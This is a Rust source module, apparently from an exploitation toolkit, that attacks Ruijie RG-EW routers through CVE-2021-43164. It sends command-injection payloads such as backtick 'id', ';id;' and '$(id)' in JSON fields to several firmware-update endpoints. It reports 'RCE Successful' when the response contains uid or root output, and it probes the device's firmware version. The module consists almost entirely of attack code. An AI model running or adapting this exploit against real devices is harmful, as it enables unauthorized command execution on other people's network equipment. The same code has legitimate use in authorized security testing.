use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target};

/// Ruijie RG-EW Series updateVersion RCE (CVE-2021-43164)
/// 
/// Affects: RG-EW Series Routers up to ReyeeOS 1.55.1915 / EW_3.0(1)B11P55
/// Remote Code Execution via updateVersion function
/// Reference: NIST / Exploit-DB

const TIMEOUT_SECS: u64 = 10;

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_target = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    
    let normalized = normalize_target(&raw_target)?;
    let base_url = if normalized.contains("://") {
        normalized.clone()
    } else {
        format!("http://{}", normalized)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .build()?;
    
    println!("{} Testing updateVersion RCE vulnerability...", "[*]".blue());
    
    // The vulnerability is in the firmware update functionality
    // Can inject commands via version check URL parameter
    
    let exploit_endpoints = vec![
        (format!("{}/cgi-bin/luci/api/updateVersion", base_url.trim_end_matches('/')), "POST"),
        (format!("{}/goform/checkVersion", base_url.trim_end_matches('/')), "POST"),
        (format!("{}/api/system/updatefirmware", base_url.trim_end_matches('/')), "POST"),
    ];
    
    // Payload that attempts command injection via URL parameter
    // The vulnerability allows arbitrary URL which can be a command injection vector
    let malicious_payloads = vec![
        serde_json::json!({
            "url": "http://127.0.0.1/`id`",
            "version": "1.0.0"
        }),
        serde_json::json!({
            "check_url": ";id;",
            "action": "check"
        }),
        serde_json::json!({
            "server": "127.0.0.1$(id)"
        }),
    ];
    
    for (endpoint, method) in &exploit_endpoints {
        println!("{} Testing: {} [{}]", "[*]".dimmed(), endpoint, method);
        
        for payload in &malicious_payloads {
            let resp = if *method == "POST" {
                client.post(endpoint).json(payload).send().await
            } else {
                client.get(endpoint).send().await
            };
            
            match resp {
                Ok(r) => {
                    let status = r.status();
                    let text = r.text().await.unwrap_or_default();
                    
                    // Check for command execution signs
                    if text.contains("uid=") || text.contains("root") || 
                       text.contains("gid=") {
                        println!("{} RCE Successful!", "[+]".green().bold());
                        println!("{} Command output detected:", "[*]".blue());
                        println!("{}", text);
                        println!("{} VULNERABLE to CVE-2021-43164!", "[VULN]".red().bold());
                        return Ok(());
                    }
                    
                    // Check for exploitable error messages
                    if text.contains("wget") || text.contains("curl") || 
                       text.contains("/bin/") || text.contains("sh:") {
                        println!("{} Possible command execution detected!", "[+]".yellow());
                        println!("{} Response: {}", "[*]".blue(), &text[..text.len().min(400)]);
                    }
                    
                    if status.is_success() && !text.contains("error") {
                        println!("{} HTTP {} - Endpoint accessible", "[*]".yellow(), status);
                    }
                },
                Err(e) => {
                    println!("{} {} - {}", "[*]".dimmed(), endpoint, e);
                }
            }
        }
    }
    
    // Test version check endpoint
    let version_url = format!("{}/cgi-bin/luci/admin/system/version", base_url.trim_end_matches('/'));
    println!("{} Checking firmware version...", "[*]".blue());
    
    if let Ok(resp) = client.get(&version_url).send().await {
        let text = resp.text().await.unwrap_or_default();
        if text.contains("ReyeeOS") || text.contains("EW_3.0") {
            println!("{} Found Ruijie ReyeeOS - potential target!", "[+]".green());
            println!("{} Version info: {}", "[*]".blue(), &text[..text.len().min(200)]);
        }
    }
    
    println!();
    println!("{} Could not confirm RCE.", "[*]".yellow());
    println!("{} Device may be patched (version > EW_3.0(1)B11P55).", "[*]".cyan());
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Ruijie RG-EW updateVersion RCE (CVE-2021-43164)         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
